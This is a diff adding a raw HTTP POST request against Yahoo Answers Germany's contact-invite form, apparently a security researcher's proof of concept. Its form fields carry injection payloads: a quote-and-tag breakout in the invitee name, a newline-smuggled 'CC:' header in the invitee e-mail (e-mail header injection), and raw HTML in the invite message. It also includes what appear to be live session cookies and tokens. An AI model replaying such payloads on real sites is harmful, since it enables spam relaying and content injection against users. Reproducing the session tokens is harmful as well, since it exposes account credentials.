@@ -1,0 +1,13 @@
+POST /my/contacts/invite/;_ylt= HTTP/1.1
+Host: de.answers.yahoo.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:25.0) Gecko/20100101 Firefox/25.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://de.answers.yahoo.com/my/contacts/invite/
+Cookie: B=eo253lt98g3si&b=4&d=TkBvkWxpYFOT2Qc693B1ba2AAvs-&s=od&i=v9MkgIRDgAlJj1H6zBX.; RMBX=eo253lt98g3si&b=3&s=84&t=320; ypcdb=4039c40a3130cf7055ee843dee32295e; AO=o=0; F=a=FIuOMO8MvSptdKos8k4_KTg1Rkly6AogQYYO3dnY2CaoMnPw3CUtYSAK1KBCXzwLi5tFeOA-&b=o6wc; PH=l=de-DE&i=de&fn=SqG4tBsdfjZP4MvazVU-; T=z=qRRkSBuWmkSBj4B.I8PJoK0NjA0NgY2NU4zME8zTjczNzYyMD&a=QAE&sk=DAAja6nbqwOjtM&ks=EAAdyU7NVOjMS8kvGdQjj4WBA--~E&d=c2wBTVRjek1RRXhNamswTnpnME9UQTBNREUxTnpjME5qVS0BYQFRQUUBZwFWQVpTTURBNlRZS042UVpZRlZLUVVYUkxLVQFzY2lkAWRkOGlMWGdTcHVXV01NVkJEaEFJQ3dzcThTYy0BYWMBQUpnNFFZMUoBdGlwAVUxYnJKRAFzYwF3bAF6egFxUlJrU0JmV0E-; YLS=v=1&p=1&n=0; ucs=bnas=0; Y=v=1&n=fqhifd02ahl46&l=8dj4hd4jm0274/o&p=m2pvvde012000000&iz=&r=s6&lg=de-DE&intl=de; answers=i3ixGNIX3URhVoQEqjkdrZwD6rzH.P3LZ22o5_QnBHoePCL5KrAlYhhrnQF_1wScwe1Jofp05SrL57Vw4PwHQnJGoVNB3Ed1.Da7j4PT0BQlaVMoTT6RWsXZ.wwo6U2MHzcbi_ZESSugcOEApeCn5bzWubvXkILgsCL9wuMTaajsGjnrhg--; POPUPCHECK=1385332478816; yanswers=d=MUVRtEwX3UQ15bKJ5qw50HZDeLDaTYy4_ZQNNJRiCbjbLtCAkJM9oe14&v=1
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 626
+
+.crumb=vJpL4tKNhr0&action=addcontacts&ks-invitee-name=Foo+test%22%3E%3Ch1%3Efooobar%3C%2Fh1%3E&ks-invitee-email=test%40internetwache.org%0ACC: test2@internetwache.org&ks-invitee-name=&ks-invitee-email=&ks-invitee-name=&ks-invitee-email=&peeps-invitee-message=Hallo%2C%0D%0A%0D%0AIch+m%C3%B6chte+meine+Fragen+und+Antworten+aus+Yahoo+Clever+gerne+mit+Ihnen+teilen.+Hier+treffen+Sie+Millionen+von+Nutzern%2C+um+Wissen+auszutauschen.+Bitte+nehmen+Sie+auch+an<h1>foobar</h1>+meinem+Netzwerk+teil%2C+um+so+komfortabler+Fragen+und+Antworten+auszutauschen+und+gegenseitig+von+unserem+Wissen+profitieren+zu+k%C3%B6nnen.&submit=Einladen
